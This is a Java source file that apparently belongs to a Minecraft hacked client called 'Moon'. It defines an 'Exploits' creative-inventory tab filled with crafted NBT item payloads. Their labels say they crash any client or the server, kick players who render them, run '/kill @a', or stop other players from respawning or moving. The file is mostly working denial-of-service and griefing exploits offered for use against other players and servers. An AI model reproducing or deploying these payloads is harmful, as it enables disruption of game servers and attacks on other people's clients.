package Moon.mods.crashitems;

import Moon.helpers.ChatHelper;
import Moon.helpers.ItemStackHelper;
import net.minecraft.client.Minecraft;
import net.minecraft.creativetab.CreativeTabs;
import net.minecraft.init.Blocks;
import net.minecraft.init.Items;
import net.minecraft.item.Item;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.*;

import java.util.List;
import java.util.Random;

public class TabExploits extends CreativeTabs {
    ItemStack firework;

    public TabExploits() {
        super(12, "ExploitsTab");
    }

    @Override
    public void displayAllReleventItems(final List<ItemStack> itemList) {
        itemList.add(ItemStackHelper.stringtostack("command_block_minecart 1 0 {Command:/kill @a}").setStackDisplayLore("Contains \"/kill @a\" command"));
        itemList.add(ItemStackHelper.stringtostack("armor_stand 1 0 {EntityTag:{ShowArms:1,NoBasePlate:1}}").setStackDisplayLore("Better ArmorStand"));
        itemList.add(ItemStackHelper.stringtostack("minecraft:blaze_rod 1 0 {display:{Name:\"Magic Wand\"},AttributeModifiers:[{AttributeName:\"generic.maxHealth\",Name:\"generic.maxHealth\",Amount:40,Operation:0,UUIDMost:83174,UUIDLeast:854379},{AttributeName:\"generic.knockbackResistance\",Name:\"generic.knockbackResistance\",Amount:100,Operation:0,UUIDMost:32261,UUIDLeast:467653},{AttributeName:\"generic.movementSpeed\",Name:\"generic.movementSpeed\",Amount:1.0,Operation:0,UUIDMost:50068,UUIDLeast:209167},{AttributeName:\"generic.attackDamage\",Name:\"generic.attackDamage\",Amount:100,Operation:0,UUIDMost:95220,UUIDLeast:620747}],Unbreakable:1}"));
        itemList.add(ItemStackHelper.stringtostack("minecraft:mob_spawner 1 0 {display:{Name:\"1000*100 TNT Spawner\"},BlockEntityTag:{EntityId:FallingSand,SpawnData:{Motion:[0.0,0.0,0.0],Block:mob_spawner,Data:0,TileEntityData:{EntityId:PrimedTnt,SpawnData:{Motion:[0.0,0.0,0.0],Fuse:40,CustomNameVisible:1},SpawnCount:1000,SpawnRange:10,RequiredPlayerRange:100,Delay:0,MaxNearbyEntities:100},Time:1,DropItem:0},SpawnCount:100,SpawnRange:100,RequiredPlayerRange:100,Delay:20,MaxNearbyEntities:100}}"));
        itemList.add(ItemStackHelper.stringtostack("minecraft:dragon_egg 1 0"));
        itemList.add(ItemStackHelper.stringtostack("minecraft:command_block 1 0"));
        itemList.add(ItemStackHelper.stringtostack("minecraft:barrier 1 0"));
        itemList.add(ItemStackHelper.stringtostack("minecraft:mob_spawner 1 0"));
        itemList.add(ItemStackHelper.stringtostack("minecraft:banner 1 0"));
        itemList.add(ItemStackHelper.stringtostack("minecraft:item_frame 1 0"));
        itemList.add(ItemStackHelper.stringtostack("minecraft:bedrock 1 0"));
        itemList.add(ItemStackHelper.stringtostack("minecraft:mob_spawner 1 0 {BlockEntityTag:{Items:[0:{Slot:0,id:\"minecraft:mob_spawner\",Count:1,tag:{HideFlags:63,BlockEntityTag:{EntityId:\"ItemFrame\",},display:{Name:\"Client Crash Spawner\",},},SpeedMine:0,},],},display:{Name:\"Client Crash Spawner\",},}"));
        itemList.add(ItemStackHelper.stringtostack("minecraft:mob_spawner 1 0 {BlockEntityTag:{Items:[0:{Slot:0,id:minecraft:mob_spawner,Count:1,tag:{HideFlags:63,BlockEntityTag:{EntityId:Painting,},display:{Name:Client Crash Spawner 2,},},SpeedMine:0,},],},display:{Name:Client Crash Spawner 2,},}"));
        itemList.add(ItemStackHelper.stringtostack("minecraft:mob_spawner 1 0 {BlockEntityTag:{Items:[0:{Slot:0,id:\"minecraft:mob_spawner\",Count:1,tag:{HideFlags:63,BlockEntityTag:{EntityId:\"Painting\",RequiredPlayerRange:100,MaxNearbyEntities:999999,SpawnCount:100,SpawnData:{Item:{},Facing:0,ItemRotation:0,},MaxSpawnDelay:1,SpawnRange:100,Delay:1,MinSpawnDelay:1,},display:{Name:\"Server Crash Spawner\",},},SpeedMine:0,},],},display:{Name:\"Server Crash Spawner\",},}"));
        itemList.add(ItemStackHelper.stringtostack("potion 1 16395 {HideFlags:63,display:{Name:\"AntiJumpPotion\",Lore:[Throw other players with it and see how they can no longer jump]},CustomPotionEffects:[{Id:8,Amplifier:128,Duration:20000000}]}"));
        itemList.add(ItemStackHelper.stringtostack("potion 1 16395 {HideFlags:63,display:{Name:\"AntiRespawnPotion\",Lore:[Throw other players with it and see how they can no longer respawn]},CustomPotionEffects:[{Id:6,Amplifier:-24,Duration:0},{Id:10,Amplifier:-24,Duration:19999980},{Id:21,Amplifier:-24,Duration:19999980}]}"));
        itemList.add(ItemStackHelper.stringtostack("potion 1 16395 {HideFlags:63,display:{Name:\"NoMovePotion\",Lore:[Throw other players with it and see how they can no longer move]},CustomPotionEffects:[{Id:2,Amplifier:127,Duration:20000000}]}"));
        itemList.add(ItemStackHelper.stringtostack("anvil 1 2019").setStackDisplayName("Crash-Anvil").setStackDisplayLore("crash any client"));
        itemList.add(ItemStackHelper.stringtostack("wooden_slab 1 2019").setStackDisplayName("Bugged wooden_slab"));
        itemList.add(ItemStackHelper.stringtostack("minecraft:hopper 1 0 {BlockEntityTag:{Items:[0:{Slot:0,id:\"skull\",Count:64,tag:{SkullOwner:{Id:\"0\",},},},1:{Slot:1,id:\"skull\",Count:64,tag:{SkullOwner:{Id:\"0\",},},},2:{Slot:2,id:\"skull\",Count:64,tag:{SkullOwner:{Id:\"0\",},},},3:{Slot:3,id:\"skull\",Count:64,tag:{SkullOwner:{Id:\"0\",},},},4:{Slot:4,id:\"skull\",Count:64,tag:{SkullOwner:{Id:\"0\",},},},],},display:{Lore:[0:\"Place this hopper and destroy it to kick around players\",],Name:\"Crash Hopper\",},}"));
        itemList.add(ItemStackHelper.stringtostack("armor_stand 1 0 {display:{Lore:[0:\"Kick all players who render this ArmorStand\",],Name:\"Kick ArmorStand\",},EntityTag:{Equipment:[0:{},1:{id:\"leather_boots\",Count:1,tag:{display:{color:-33536,},},},2:{id:\"leather_leggings\",Count:1,tag:{display:{color:-33536,},},},3:{id:\"leather_chestplate\",Count:1,tag:{display:{color:-33536,},},},4:{id:\"leather_helmet\",Count:1,tag:{display:{color:-33536,},},},],},}"));
        itemList.add(ItemStackHelper.stringtostack("diamond_pickaxe 1 0 {ench:[0:{lvl:32767,id:16,},1:{lvl:32767,id:21,},2:{lvl:32767,id:32,},3:{lvl:32767,id:35,},],Unbreakable:1,HideFlags:63,display:{Name:\"Crash-Pickaxe\",},}"));
        final Random rnd = new Random();
        final String[] meme = {"Moon was there", "Moon was there", "Moon was here"};
        try {
            final ItemStack itm = new ItemStack(Items.armor_stand);
            final NBTTagCompound base = new NBTTagCompound();
            final NBTTagCompound entityTag = new NBTTagCompound();
            entityTag.setBoolean("NoBasePlate", true);
            entityTag.setBoolean("Invisible", false);
            final NBTTagCompound randomColor = new NBTTagCompound();
            final NBTTagCompound display = new NBTTagCompound();
            randomColor.setTag("display", display);
            final NBTTagList pos = new NBTTagList();
            final NBTTagList motion = new NBTTagList();
            pos.appendTag(new NBTTagDouble(Minecraft.getMinecraft().thePlayer.posX));
            pos.appendTag(new NBTTagDouble(Minecraft.getMinecraft().thePlayer.posY));
            pos.appendTag(new NBTTagDouble(Minecraft.getMinecraft().thePlayer.posZ));
            motion.appendTag(new NBTTagDouble(rnd.nextInt(700) / 100.0));
            motion.appendTag(new NBTTagDouble(rnd.nextInt(300) / 100.0));
            motion.appendTag(new NBTTagDouble(rnd.nextInt(700) / 100.0));
            entityTag.setBoolean("Invisible", true);
            entityTag.setBoolean("CustomNameVisible", true);
            final String random = meme[new Random().nextInt(meme.length)];
            final int randomNum = 1 + (int) (Math.random() * 9.0);
            entityTag.setString("CustomName", ChatHelper.fix("&" + randomNum + "&l" + random));
            entityTag.setTag("Pos", pos);
            entityTag.setTag("Motion", motion);
            base.setTag("EntityTag", entityTag);
            itm.setTagCompound(base);
            itm.setStackDisplayName("Place me");
            itemList.add(itm);
        } catch (Exception ignored) {
        }
        if (this.firework == null) {
            final Random rand = new Random();
            this.firework = new ItemStack(Items.fireworks);
            final NBTTagCompound tags = new NBTTagCompound();
            final NBTTagList explosions = new NBTTagList();
            for (int i4 = 1; i4 <= 3000; ++i4) {
                final NBTTagCompound effect3 = new NBTTagCompound();
                effect3.setByte("Type", (byte) rand.nextInt(5));
                effect3.setBoolean("Flicker", rand.nextBoolean());
                effect3.setBoolean("Trail", rand.nextBoolean());
                effect3.setIntArray("Colors", new int[]{rand.nextInt(16777215)});
                effect3.setIntArray("FadeColors", new int[]{rand.nextInt(16777215)});
                explosions.appendTag(effect3);
            }
            tags.setTag("Explosions", explosions);
            this.firework.setTagInfo("Fireworks", tags);
            this.firework.setTagInfo("HideFlags", new NBTTagInt(63));
            this.firework.setStackDisplayName("Random Firework");
        }
        itemList.add(this.firework);
        final ItemStack itm2 = new ItemStack(Items.iron_sword, 1);
        final String nbt3 = "{AttributeModifiers:[{AttributeName:generic.movementSpeed,Name:generic.movementSpeed, Amount:2147483647,Operation:0, UUIDMost:246216, UUIDLeast:24636}], display:{Name:Hold Me}, Unbreakable:1,HideFlags:63}";
        try {
            itm2.setTagCompound(JsonToNBT.getTagFromJson(nbt3));
        } catch (NBTException e) {
            e.printStackTrace();
        }
        itm2.setStackDisplayLore("Gives the player who's holding it a extreme speed boost.");
        itemList.add(itm2);
        final ItemStack itm3 = new ItemStack(Items.iron_sword);
        String nbt5;
        final NBTTagCompound base3 = new NBTTagCompound();
        final NBTTagList nbttaglist = new NBTTagList();
        nbttaglist.appendTag(new NBTTagString("+1000% Speed"));
        base3.setTag("Lore", nbttaglist);
        itm3.setTagInfo("display", base3);
        nbt5 = "{AttributeModifiers:[{AttributeName:generic.maxHealth,Name:generic.maxHealth, Amount:-1,Operation:0, UUIDMost:246216, UUIDLeast:24636}], display:{Name:Hold Me}, Unbreakable:1,HideFlags:63}";
        try {
            itm3.setTagCompound(JsonToNBT.getTagFromJson(nbt5));
        } catch (NBTException e2) {
            e2.printStackTrace();
        }
        itm3.setStackDisplayLore("Kills the player holding the sword.");
        itemList.add(itm3);
        itemList.add(ItemStackHelper.stringtostack("furnace 1 0 {BlockEntityTag:{Items:[{id:skull,Count:64,Slot:0,tag:{SkullOwner:{Id:\"0\"}}}]}}").setStackDisplayLore("Crash(Every Client)"));
    }

    @Override
    public ItemStack getIconItemStack() {
        return new ItemStack(Item.getItemFromBlock(Blocks.command_block));
    }

    @Override
    public String getTranslatedTabLabel() {
        return "Exploits";
    }

    @Override
    public Item getTabIconItem() {
        return null;
    }
}
